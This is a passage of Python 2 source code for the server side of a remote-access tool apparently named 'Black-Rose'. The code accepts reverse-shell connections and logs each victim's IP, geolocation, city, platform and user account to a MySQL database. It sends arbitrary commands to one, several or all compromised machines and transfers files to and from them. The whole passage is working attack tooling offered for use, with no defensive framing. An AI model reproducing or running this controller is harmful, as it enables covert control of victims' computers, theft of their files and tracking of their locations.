        print colored("[MESSAGE]>", "grey"), colored("Client information", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("NOT RECEIVED", "red"), colored("]", "white") 
        Logger("Client information not received.\n")

    # Store client information
    ALL_PLATFORMS.append(Load_DATA['PLATFORM'])
    ALL_PLATFORMS_ARCH.append(Load_DATA['PLATFORM_ARCH'])
    ALL_USER_ACCOUNTS.append(Load_DATA['USER_ACCOUNT'])
    ALL_PUBLIC_IP.append(Load_DATA['PUBLIC_IP'])
    ALL_LATITUDE_LONGITUDE.append(Load_DATA['LATITUDE_LONGITUDE'])
    ALL_COUNTRYS.append(Load_DATA['COUNTRY'])
    ALL_CITYS.append(Load_DATA['CITY'])

    Logger("Client information was successfully received: " + str(Client_INFO) + ".\n")



# Display targets informations
def Targets_INFO():
    try:
        if len(ALL_ADDRESSES) == 0:
            print colored("[MESSAGE]>", "grey"), colored("List of targets information", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("WAS EMPTY", "red"), colored("]", "white") 
            Logger("List of targets information was empty.\n")
        else:
            # Creating information table
            Info_TABLE = PrettyTable(['[Index]', '[Private-IP]', '[Public-IP]', '[Latitude-Longitude]', '[Country]', '[City]', '[Platform]', '[Platform-ARCH]', '[User-Account]'])

            for Index in range(len(ALL_ADDRESSES)):
                Info_TABLE.add_row([Index, ALL_ADDRESSES[Index][0], ALL_PUBLIC_IP[Index][0], ALL_LATITUDE_LONGITUDE[Index][0], ALL_COUNTRYS[Index][0], ALL_CITYS[Index][0], ALL_PLATFORMS[Index], ALL_PLATFORMS_ARCH[Index], ALL_USER_ACCOUNTS[Index]])
            print "\n", Info_TABLE, "\n"
            Logger("List of targets information was successfully displayed.\n")
    except:
        Logger("Display list of targets information was failed.\n")



# list of targets
def Targets_LIST():
    if len(ALL_CONNECTIONS) == 0:
        print colored("[MESSAGE]>", "grey"), colored("Targets list", "white"), colored("\t\t\t\t\t:", "white"), colored("[", "white"), colored("WAS EMPTY", "red"), colored("]", "white") 
        Logger("Targets list was empty.\n")
    else:
        # Create table
        Table = PrettyTable(['[Index]', '[IP-Address]', '[Port-Number]'])

        # Send token for checking targets status (Dead or Alive !)
        TOKEN = "whosthere"
        for Index, Connection in enumerate(ALL_CONNECTIONS):
            try:
                Connection.send(TOKEN)
                Logger("Status token was successfully sent.\n")
                Token_RESPONSE = Connection.recv(4)
                # If target was alive
                if Token_RESPONSE == "DONE":
                    Logger("Target was alive: " + str(ALL_ADDRESSES[Index]) + "\n")
                else:
                    Logger("Unknown token response.\n")
            except:
                # If target was dead (Remove all information about it)
                Logger("Target was dead: " + str(ALL_ADDRESSES[Index]) + "\n")
                del ALL_ADDRESSES[Index]
                del ALL_CONNECTIONS[Index]
                continue
            
            Table.add_row([Index, ALL_ADDRESSES[Index][0], ALL_ADDRESSES[Index][1]])
        
        print "\n", Table, "\n"



# +-------------------------+
# | Reverse shell functions |
# +-------------------------+

def Selection(Command):
    global Selected_ITEM

    try:
        # Convert. (Like select 1 ----> 1)
        Selected_ITEM = int(Command.replace("select ", ""))
        Target = ALL_CONNECTIONS[Selected_ITEM]

        print colored("[TARGET]>", "cyan"), colored("Now you are connected to " + str(ALL_ADDRESSES[Selected_ITEM][0]), "white")
        Logger("Selected target: " + str(ALL_ADDRESSES[Selected_ITEM][0]) + "\n")
        return Target
    except:
        print colored("[ERROR]", "red"), colored("Invalid selection!", "white")
        Logger("Invalid selection!\n")
        return None



# Unicast reverse shell
def Unicast(Target):
    try:
        while True:
            Command = raw_input(colored("\n" + str(ALL_ADDRESSES[Selected_ITEM][0]) + "> ", "magenta"))
            
            if Command == "" or Command == " ":
                print colored("[ERROR]>", "red"), colored("Command not found!", "white")
                Logger("[UNICAST]> Command not found!.\n")
            
            elif Command == "exit":
                break
            elif "download" in Command:
                Download(Command, Target)
            elif "upload" in Command:
                Upload(Command, Target)
            else:
                # Sending command
                Target.send(Command)
                Logger("[UNICAST]> Command was sent.\n")
                
                # Receiving command response
                Command_RESPONSE = Target.recv(4096)
                Logger("[UNICAST]> Command response was received.\n")
                print Command_RESPONSE
                
    except:
        print colored("[ERROR]>", "red"), colored("Connection was lost with: " + str(ALL_ADDRESSES[Selected_ITEM][0]))
        Logger("[UNICAST]> Connection was lost with: " + str(ALL_ADDRESSES[Selected_ITEM][0]) + "\n")

                    

# Multicast reverse shell
def Multicast(Command_RANGE):
    Target_LIST = []
    Trial_LIST = []
    Finally_LIST = []

    # Convert command just like unicast function
    Cmd = Command_RANGE.replace("range ", "")

    try:
        for Selection in Cmd.split():
            Target_LIST.append(int(Selection))
    except:
        print colored("[ERROR]>", "red"), colored("Please specify the targets.", "white")
        Logger("[MULTICAST]> No targets.\n")
    
    # Checking connection (Exist or not)
    for Connection in ALL_CONNECTIONS:
        Trial_LIST.append(ALL_CONNECTIONS.index(Connection))
    
    for Selection in Target_LIST:
        if Selection in Trial_LIST:
            Finally_LIST.append(Selection)
        else:
            print colored("[ERROR]>", "red"), colored("Invalid selection:", "white"), colored(Selection, "yellow")
            Logger("[MULTICAST]> Invalid selection: " + str(Selection) + "\n")
            continue
    
    if len(Finally_LIST) > 1:
        print colored("[MESSAGE]>", "grey"), colored("Your targets are:", "white"), colored(Finally_LIST, "yellow")
        Logger("[MULTICAST]> Targets are: " + str(Finally_LIST) + "\n")
        
        while True:
            Command = raw_input(colored("\n[Multicast-ReverseShell@Black-Rose]> ", "magenta"))
            
            if Command == "" or Command == " ":
                print colored("[WARNING]>", "yellow"), colored("Command not found!", "white")
                Logger("[MULTICAST]> Command not found!\n")
                continue
            
            if Command == "exit":
                break
            
            for Selection in Finally_LIST:
                try:
                    # Sending command
                    ALL_CONNECTIONS[Selection].send(Command)
                    print colored("[MESSAGE]>", "grey"), colored("Multicast command launcher status:", "white"), colored("SUCCESS", "green")
                    Logger("[MULTICAST]> Command launcher status: Success\n")
                    
                    # Receiving response
                    Response = ALL_CONNECTIONS[Selection].recv(4096)
                    print colored("[MESSAGE]>", "grey"), colored("Response was received from:", "white"), ALL_ADDRESSES[Selection][0], "\n"
                    Logger("[MULTICAST]> Response was received from " + str(ALL_ADDRESSES[Selection][0]) + "\n")

                    # Display response
                    print Response
                except socket.error as MSG:
                    print colored("[MESSAGE]>", "grey"), colored("Multicast command launcher status:", "white"), colored("FAILED", "red")
                    print colored("[ERROR]>", "red"), colored("Can not found any connection with " + str(ALL_ADDRESSES[Selection][0]))
                    Logger("[MULTICAST]> Can not found any connection with " + str(ALL_ADDRESSES[Selection][0]) + "\n")
                    Logger("[MULTICAST]> Reason: " + str(MSG) + "\n")
                    continue



# Broadcast reverse shell
def Broadcast():
    while True:
        Command = raw_input(colored("\n[Broadcast-ReverseShell@Black-Rose]> ", "magenta"))
        
        if Command == "" or Command == " ":
            print colored("[WARNING]>", "yellow"), colored("Command not found!", "white")
            Logger("[BROADCAST]> Command not found!\n")
            continue
            
        if Command == "exit":
            break
        
        if len(Command) > 0:
            for Index, Connections in enumerate(ALL_CONNECTIONS):
                try:
                    # Sending command
                    Connections.send(Command)
                    print colored("[MESSAGE]>", "grey"), colored("Broadcast command launcher status:", "white"), colored("SUCCESS", "green")
                    Logger("[BROADCAST]> Command launcher status: Success\n")
                    
                    # Receiving response
                    Response = Connections.recv(4096)
                    print colored("[MESSAGE]>", "grey"), colored("Response was received from:", "white"), ALL_ADDRESSES[Index][0], "\n"
                    Logger("[BROADCAST]> Response was received from " + str(ALL_ADDRESSES[Index][0]) + "\n")
                    
                    # Display response
                    print Response
                    
                except socket.error as MSG:
                    print colored("[MESSAGE]>", "grey"), colored("Broadcast command launcher status:", "white"), colored("FAILED", "red")
                    print colored("[ERROR]>", "red"), colored("Can not found any connection with " + str(ALL_ADDRESSES[Index][0]))
                    Logger("[BROADCAST]> Can not found any connection with " + str(ALL_ADDRESSES[Index][0]) + "\n")
                    Logger("[BROADCAST]> Reason: " + str(MSG) + "\n")
                    continue



# +----------------+
# | File functions |
# +--- ------------+

# Download files
def Download(Command, Target):
    # Checking noisy command
    if Command[:8] != "download":
        print colored("[ERROR]>", "red"), colored("Command was wrong!", "white")
        Logger("[DOWNLOAD]> Command was wrong\n")
    elif Command[8:] == "" or Command[8:] == " ":
        print colored("[ERROR]>", "red"), colored("Filename not found!", "white")
        Logger("[DOWNLOAD]> Filename not found!\n")
    else:
        try:
            # Sending filename to download
            Target.send(Command)
        except socket.error as MSG:
            print colored("[ERROR]>", "red"), colored("Can not send filename for download", "white")
            Logger("[DOWNLOAD]> Can't send filename for download\n")
            Logger("[DOWNLOAD]> Reason: " + str(MSG) + "\n")
        
        try:
            # Receive token to know (is file exist or not)
            Result = Target.recv(3)
            Logger("[DOWNLOAD]> Existing token was received successfully\n")
        except socket.error as MSG:
            Logger("[DOWNLOAD]> Can't receive existing token\n")
            Logger("[DOWNLOAD]> Reason: " + str(MSG) + "\n")
        

        # FNF = File Not Found (This is token)
        if Result == "FNF":
            print colored("[MESSAGE]>", "yellow"), colored("No such file or directory", "white")
            Logger("[DOWNLOAD]> No such file or directory\n")
        
        # FND = File Found (This is token)
        elif Result == "FND":
            print colored("[MESSAGE]>", "yellow"), colored("File founded", "white")
            Logger("[DOWNLOAD]> File founded\n")
            print colored("[MESSAGE]>", "yellow"), colored("Download...", "white")
            Logger("[DOWNLOAD]> File downloaded successfully\n")

            # Checking file format
            File_format = Command[Command.find("."):]

            # Checking operating system for writing data
            if "Linux" in PLATFORM:
                try:
                    File = open(os.getcwd() + "/Downloaded" + File_format, "wb")
                except IOError:
                    print colored("[ERROR]>", "red"), colored("Unable to open file", "white")
                    Logger("[DOWNLOAD]> Unable to open file\n")
            elif "Windows" in PLATFORM:
                try:
                    File = open(os.getcwd() + r"\Downloaded" + File_format, "wb")
                except IOError:
                    print colored("[ERROR]>", "red"), colored("Unable to open file", "white")
                    Logger("[DOWNLOAD]> Unable to open file\n")
                
            # Writing data
            while True:
                Data = Target.recv(4096)
                # EOFXEOFY is a token (END OF FILE)
                if Data == "EOFXEOFY":
                    break
                File.write(Data)
            File.close()

            # Send a token to tell the destination that the bytes of the file are received
            RECVTOKEN = "ACK"
            try:
                Target.send(RECVTOKEN)
                print colored("[STATUS]>", "blue"), colored("File downloaded successfully", "white")
                Logger("[DOWNLOAD]> File downloaded successfully\n")
            except socket.error as MSG:
                print colored("[ERROR]>", "red"), colored("Can't send ack token!", "white")
                Logger("[DOWNLOAD]> Can't send ack token\n")
                Logger("[DOWNLOAD]> Reason: " + str(MSG) + "\n")
        else:
            print colored("[ERROR]>", "red"), colored("Unknown token!", "white")
            Logger("[DOWNLOAD]> Unknown token!\n")



# Upload files
def Upload(Command, Target):
    # Checking noisy command
    if Command[:6] != "upload":
        print colored("[ERROR]>", "red"), colored("Command was wrong!", "white")
        Logger("[UPLOAD]> Command was wrong!\n")
    elif Command[6:] == "" or Command[6:] == " ":
        print colored("[ERROR]>", "red"), colored("File address not found!", "white")
        Logger("[UPLOAD]> File address not found!\n")
    else:
        # Checking file exist or not
        Eixsting = os.path.exists(Command[7:])

        if Eixsting == False:
            print colored("[ERROR]>", "red"), colored("No such a file or directory", "white")
            Logger("[UPLOAD]> No such a file or directory\n")
        else:
            print colored("[MESSAGE]>", "grey"), colored("File found", "white")
            Logger("[UPLOAD]> File found\n")
            print colored("[MESSAGE]>", "grey"), colored("Uploading...", "white")
            Logger("[UPLOAD]> Uploading...\n")

            # Uploading...
            Target.send(Command)
            # Sleep for 5 sec
            time.sleep(5) 

            # Reading data
            try:
                File = open(Command[7:])
            except IOError:
                print colored("[ERROR]>", "red"), colored("Unable to open file", "white")
                Logger("[UPLOAD]> Unable to open file\n")
            
            Data = File.read(1024)

            while Data:
                Target.send(Data)
                Data = File.read(1024)
            File.close()
        
            # Token
            ENDTOKEN = "EOFXEOFY"

            print colored("[STATUS]>", "blue"), colored("File uploaded successfully", "white")
            Logger("[UPLOAD]> File uploaded successfully\n")
            time.sleep(5)
            Target.send(ENDTOKEN)



#  +------------------+
# | Working with data |
# +------------------+           

# Checking database table
def MySQL_TABLE_CHECK():
    # SQL query
    MySQL_COMMAND = "SELECT 1 FROM data LIMIT 1" 

    # Checking table is exist or not
    try:
        # If table was existed:
        # Execute SQL query using execute() method
        Cursor.execute(MySQL_COMMAND)
        print colored("[MESSAGE]>", "grey"), colored("Database table", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("EXIST", "green"), colored("]", "white")
        Logger("[DATABASE]> Data table was exist\n")
    except:
        print colored("[MESSAGE]>", "grey"), colored("Database table", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("NOT EXIST", "red"), colored("]", "white")
        Logger("[DATABASE]> Data table was not exist\n")
        Create_MySQL_TABLE()



# Creating database table
def Create_MySQL_TABLE():
    try:
        # Execute SQL query using execute() method
        Cursor.execute("CREATE TABLE data (ID INT NOT NULL PRIMARY KEY AUTO_INCREMENT, Private_IP VARCHAR(20) NOT NULL, Public_IP VARCHAR(20) NOT NULL, Latitude_Longitude VARCHAR(20) NOT NULL, Country VARCHAR(20) NOT NULL, City VARCHAR(20) NOT NULL, Platform VARCHAR(20) NOT NULL, Platform_ARCH VARCHAR(20) NOT NULL, User_Account VARCHAR(20) NOT NULL)")
        print colored("[MESSAGE]>", "grey"), colored("Database table", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("CREATED", "green"), colored("]", "white")
        Logger("[DATABASE]> Data table was created\n")  
    except:
        print colored("[MESSAGE]>", "grey"), colored("Database table", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("NOT CREATED", "red"), colored("]", "white")
        Logger("[DATABASE]> Data table was not created\n")



# Save
def Store_DATA():
    print colored("[MESSAGE]>", "grey"), colored("Storing data... (Waiting)", "white")
    Logger("[DATABASE]> Storing data...\n")

    if len(ALL_ADDRESSES) == 0:
        print colored("[WARNING]>", "yellow"), colored("Address list was empty!", "white")
        Logger("[DATABASE]> Address list was empty!\n")
    else:
        for Index in range(len(ALL_ADDRESSES)):
            if ALL_ADDRESSES[Index] not in ALL_ADDRESSES_ADDED:
                # Execute SQL query using execute() method
                Cursor.execute("INSERT INTO data (Private_IP, Public_IP, Latitude_Longitude, Country, City, Platform, Platform_ARCH, User_Account) VALUE (%s, %s, %s, %s, %s, %s, %s, %s)", (ALL_ADDRESSES[Index][0], ALL_PUBLIC_IP[Index][0], ALL_LATITUDE_LONGITUDE[Index][0], ALL_COUNTRYS[Index][0], ALL_CITYS[Index][0], ALL_PLATFORMS[Index], ALL_PLATFORMS_ARCH[Index], ALL_USER_ACCOUNTS[Index]))   
                ALL_ADDRESSES_ADDED.append(ALL_ADDRESSES[Index])
            else:
                print colored("[WARNING]>", "yellow"), colored("This target: " + str(ALL_ADDRESSES[Index]) + " was saved before", "white") 
                Logger("[DATABASE]> This target: " + str(ALL_ADDRESSES[Index]) + " was saved before\n")

        # Commit your changes in the database
        MySQL_DB.commit()
        print colored("[MESSAGE]>", "grey"), colored("Storing data", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("Done", "green"), colored("]", "white")
        Logger("[DATABASE]> Storing data was successfully\n")



# Delete
def Delete_DATA():
    # Checking values from data table
    # SQL query
    MySQL_QUERY1 = "SELECT * FROM data"
    MySQL_QUERY2 = "SELECT ID FROM data"
    MySQL_QUERY3 = "DELETE FROM data WHERE ID=%s"

    try:
        # Execute SQL query using execute() method
        Cursor.execute(MySQL_QUERY1)
        # Save fetchall result
        Data = Cursor.fetchall()

        if len(Data) == 0:
            print colored("[WARNING]>", "yellow"), colored("Can not found any data in table", "white")
            Logger("[DATABASE]> Can not found any data in table.\n")
        else:
            print colored("[MESSAGE]>", "grey"), colored("All your saved data:", "white")
            Show_DATA()

            Data_INDEX = []
            # Execute SQL query using execute() method
            Cursor.execute(MySQL_QUERY2)
            # Save fetchall result
            Index = Cursor.fetchall()

            for i in range(len(Index)):
                Data_INDEX.append(Index[i][0])

            Question = raw_input(colored("\n[QUESTION@Black-Rose]> Do you want to delete data? (Y/N) ", "white"))
            
            if Question == "N" or Question == "n":
                print colored("[MESSAGE]>", "grey"), colored("The deletion process has been canceled.", "white")
                Logger("[DATABASE]> The deletion process has been canceled.\n")
            elif Question == "Y" or Question == "y":
                Item_INDEX = int(raw_input(colored("\n[DELETE@Black-Rose]> Enter the index number of the data you want to delete: ", "white")))
                if Item_INDEX in Data_INDEX:
                    Cursor.execute(MySQL_QUERY3, (Item_INDEX))
                    MySQL_DB.commit()
                    print colored("[MESSAGE]>", "grey"), colored("Item was deleted successfully.", "white")
                    Logger("[DATABASE]> Item was deleted successfully.\n")
                else:
                    print colored("[ERROR]>", "red"), colored("Wrong index!", "white")
                    Logger("[DATABASE]> Wrong index.\n")
            else:
                print colored("[ERROR]>", "red"), colored("Command not found!", "white")
                Logger("[DATABASE]> Command not found!\n")

    except:
        print colored("[MESSAGE]>", "grey"), colored("MySQL table values check", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("ERROR", "red"), colored("]", "white")
        Logger("[DATABASE]> MySQL table value check was failed")

# Show
def Show_DATA():
    try:
        # Checking table
        # SQL query
        MySQL_COMMAND = "SELECT 1 FROM data LIMIT 1" 

        # Checking table is exist or not
        # Execute SQL query using execute() method
        Cursor.execute(MySQL_COMMAND)
        print colored("[MESSAGE]>", "grey"), colored("Database table", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("EXIST", "green"), colored("]", "white")
        Logger("[Database]> Table was exist\n")
    except:
        print colored("[MESSAGE]>", "grey"), colored("Database table", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("NOT EXIST", "red"), colored("]", "white")
        Logger("[Database]> Table was not exist\n")
        Create_MySQL_TABLE()

    
    # Read data from database
    MySQL_COMMAND = "SELECT * FROM data"
    try:
        # Execute SQL query using execute() method
        Cursor.execute(MySQL_COMMAND)
        # Now save fetched result
        Data = Cursor.fetchall()

        if len(Data) == 0:
            print colored("[WARNING]>", "yellow"), colored("The table was empty!", "white")
            Logger("[DATABASE]> The table was empty!\n")
        else:
            Table = PrettyTable(['[Index]', '[Private-IP]', '[Public-IP]', '[Latitude-Longitude]', '[Country]', '[City]', '[Platform]', '[Platform-Arch]', '[User-Account]'])

            # Display data
            for Index in range(len(Data)):
                Table.add_row([Data[Index][0], Data[Index][1], Data[Index][2], Data[Index][3], Data[Index][4], Data[Index][5], Data[Index][6], Data[Index][7], Data[Index][8]])
                    
            print "\n", Table, "\n"
    except:
        print colored("[ERROR]>", "red"), colored("Can not show any information from database", "white")
        Logger("[DATABASE]> Can not show any information from database\n")



# Sending commands
def Black_Rose_TERMINAL():
    while True:
        try:
            Command = raw_input(colored("\n[Terminal@Black-Rose]> ", "magenta"))
            
            # Commands
            if Command == "" or Command == " ":
                Logger("[TERMINAL]> Command not found.\n")
                print colored("[WARNING]>", "yellow"), colored("Command not found!", "white")
            elif Command[:4] == "show":
                if Command[5:] == "info":
                    Logger("[TERMINAL]> show info\n")
                    Targets_INFO()
                elif Command[5:] == "list":
                    Logger("[TERMINAL]> show list\n")
                    Targets_LIST()
                elif Command[5:] == "database":
                    Logger("[TERMINAL]> show database\n")
                    Show_DATA()
                elif Command[5:] == "interfaces":
                    Logger("[TERMINAL]> show interfaces\n")
                    Network_IFACE_INFORMATION()
                elif Command[5:] == "sysinfo":
                    System_INFORMATION()
                else:
                    print colored("[WARNING]>", "yellow"), colored("'Show' command is not complete.")
                    Logger("[TERMINAL]> 'Show' command is not complete.\n")
            elif Command[:6] == "delete":
                if Command[7:] == "info":
                    Logger("[TERMINAL]> delete info\n")
                    Delete_DATA()
                else:
                    print colored("[WARNING]>", "yellow"), colored("'delete' command is not complete.")
            elif Command == "help" or Command == "?":
                Logger("[TERMINAL]> help or ?\n")
                Help()
            elif Command == "clear":
                Logger("[TERMINAL]> clear\n")
                Clear_DISPLAY()
            elif Command == "about":
                Logger("[TERMINAL]> about\n")
                About_ME()
            elif Command == "broadcast":
                Logger("[TERMINAL]> broadcast\n")
                Broadcast()
            elif Command == "save":
                Logger("[TERMINAL]> save\n")
                Store_DATA()
            elif "select" in Command:
                Logger("[TERMINAL]> select " + Command.replace("select ", "") + "\n")
                Target = Selection(Command)
                if Target is not None:
                    Unicast(Target)
            elif "range" in Command:
                Logger("[TERMINAL]> range " + Command.replace("range ", "") + "\n")
                Multicast(Command)
            else:
                print colored("[ERROR]>", "red"), colored("Command not recognized!", "white")
                Logger("[TERMINAL]> Command not recognized!\n")
        except KeyboardInterrupt:
            print colored("[ERROR]>", "red"), colored("Kill signal (CTRL+C)", "white")
            Logger("[TERMINAL]> Kill signal (CTRL+C)\n")
            Logger("Script stopped\n")
            break
    
    Cursor.close()
    MySQL_DB.close()

    for Connections in ALL_CONNECTIONS:
        Connections.close()
    
    SCT.close()
    sys.exit()



# +---------------------+
# | Threading functions |
# +---------------------+

# Thread workers
def Thread():
    for _ in range(THREAD_NUMBERS):
        Thrd = threading.Thread(target=Works)
        Thrd.daemon = True
        Thrd.start()



# Our works
def Works():
    while True:
        Queue_ITEM = QUEUE.get()

        if Queue_ITEM == 1:
            Eyes_OF_CONNECTION()
            Socket_CREATION()
            Socket_BIND("192.168.1.4", 2321)
            Socket_ACCEPT()
        
        if Queue_ITEM == 2:
            Black_Rose_TERMINAL()
            


# Jobs
def Workets_JOBS():
    for Jobs in JOBS_NUMBER:
        QUEUE.put(Jobs)
    QUEUE.join()



Clear_DISPLAY()
A_BANNER()
MySQL_CONNECTION("localhost", "root", "", "info")
MySQL_CURSOR()
User_AUTHENTICATION()
Clear_DISPLAY()
B_BANNER()
Cipher()
Thread()
Workets_JOBS()